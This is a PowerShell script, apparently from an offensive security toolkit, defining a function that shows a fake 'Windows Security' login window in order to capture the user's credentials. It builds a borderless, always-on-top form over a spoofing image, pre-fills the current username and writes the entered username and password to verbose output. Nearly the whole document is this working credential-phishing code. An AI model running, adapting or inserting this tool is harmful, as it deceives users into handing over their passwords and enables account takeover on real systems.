
function Display-FakeLoginWindow()
{
<#
.SYNOPSIS
Displays a fake password notification window to capture the user's login creds.

.DESCRIPTION
Author: Aelon Porat (@whereIsBiggles)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.EXAMPLE
Display-FakeLoginWindow

.LINK
http://www.twitter.com/whereIsBiggles

#>

    $fakeLoginWindowFile = "$env:temp\fake_login_window.png"

    if (-not (Test-Path $fakeLoginWindowFile))
    {
        Write-Error "Cannot find '$fakeLoginWindowFile'"
        break
    }

    $formCompleted = $False

    function validateForm()
    # Check password field is not empty
    {  
        if ($objTextBoxPass.Text -ne "")
        {
            Write-Verbose "Received Username: $($objTextBoxUsername.Text) | Password: $($objTextBoxPass.Text)"
            $formCompleted = $True
            $form.Close()
            $Form.Dispose()
        } 
        else
        {
            $objTextBoxPass.focus()
        }
    }

    $Label = New-Object System.Windows.Forms.Label
    $Form = New-Object system.Windows.Forms.Form

    # General form properties
    $Form.Text="Windows Security"
    $Form.MinimizeBox = $False
    $Form.MaximizeBox = $False
    $Form.WindowState = "Normal"
    $Form.StartPosition = "CenterScreen"
    $form.FormBorderStyle = "none"
    $Form.Size = New-Object System.Drawing.Size(434, 297)
    $Form.TopMost = $True
    $Form.KeyPreview = $True
    $Form.Add_KeyDown({if ($_.KeyCode -eq "Enter") {validateForm}})

    # Username text box
    $objTextBoxUsername = New-Object System.Windows.Forms.TextBox
    $objTextBoxUsername.Location = New-Object System.Drawing.Size(110,95)
    $objTextBoxUsername.Size = New-Object System.Drawing.Size(200,10)
    $objTextBoxUsername.Text = $env:USERNAME
    $form.Controls.Add($objTextBoxUsername) 

    # Password text box
    $objTextBoxPass = New-Object System.Windows.Forms.MaskedTextBox
    $objTextBoxPass.PasswordChar = '*'
    $objTextBoxPass.Location = New-Object System.Drawing.Size(110,117)
    $objTextBoxPass.Size = New-Object System.Drawing.Size(200,10)
    $form.Controls.Add($objTextBoxPass)
        
    # Checkbox 
    $checkbox1 = new-object System.Windows.Forms.checkbox
    $checkbox1.Location = new-object System.Drawing.Size(107,142)
    $checkbox1.Size = new-object System.Drawing.Size(12,12)
    $checkbox1.backcolor = "blue"
    $checkbox1.Checked = $true
    $Form.Controls.Add($checkbox1)  

    # OK button
    $OKButton = New-Object System.Windows.Forms.Button
    $OKButton.Location = New-Object System.Drawing.Size(265,260)
    $OKButton.Size = New-Object System.Drawing.Size(75,23)
    $OKButton.Text = "OK"
    $OKButton.Add_Click({validateForm})
    $Form.Controls.Add($OKButton)

    # Cancel button
    $CancelButton = New-Object System.Windows.Forms.Button
    $CancelButton.Location = New-Object System.Drawing.Size(345,260)
    $CancelButton.Size = New-Object System.Drawing.Size(75,23)
    $CancelButton.Text = "Cancel"
    $Form.Controls.Add($CancelButton)

    $img = [System.Drawing.Image]::Fromfile($fakeLoginWindowFile)
    $pictureBox = new-object Windows.Forms.PictureBox
    $pictureBox.Width = $img.Size.Width
    $pictureBox.Height = $img.Size.Height
    $pictureBox.Image = $img
    $form.controls.add($pictureBox)

    $objTextBoxPass.select()

    Write-Verbose "Fake Windows Credential window: Waiting for user input"

    $form.showDialog()
}
